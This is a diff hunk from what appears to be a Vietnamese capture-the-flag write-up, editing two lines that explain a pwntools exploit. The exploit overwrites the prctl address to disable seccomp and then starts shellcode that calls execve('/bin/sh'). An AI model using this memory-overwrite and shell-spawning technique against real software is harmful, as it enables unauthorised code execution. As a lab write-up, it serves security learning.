@@ -58,13 +58,13 @@ Chỉ khi đã chạy lệnh `prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)` (tắt kh�
 
 <img width="862" height="282" alt="Screenshot 2026-11-09 003848" src="https://github.com/user-attachments/assets/30eeb79d-8ee0-4b77-8f1b-0b0ff41cafa4" />
 
-Ghi đè địa chỉ `prctl`:
+Sử dụng tùy chọn 3 để ghi đè địa chỉ `prctl`:
 
     p.sendlineafter(b'> ',b'3')
     p.sendlineafter(b'addr: ',str(0x602058).encode())
     p.sendlineafter(b'value: ',str(0x40090e).encode())
 
-Khi đã vô hiệu hóa *seccomp* thì nhập shellcode gọi `execve('/bin/sh')`:
+Khi đã vô hiệu hóa *seccomp* thì nhập shellcode gọi `execve('/bin/sh')` qua tùy chọn 1 và chạy qua tùy chọn 2:
 
     shellcode=asm('''
         mov rax, 59
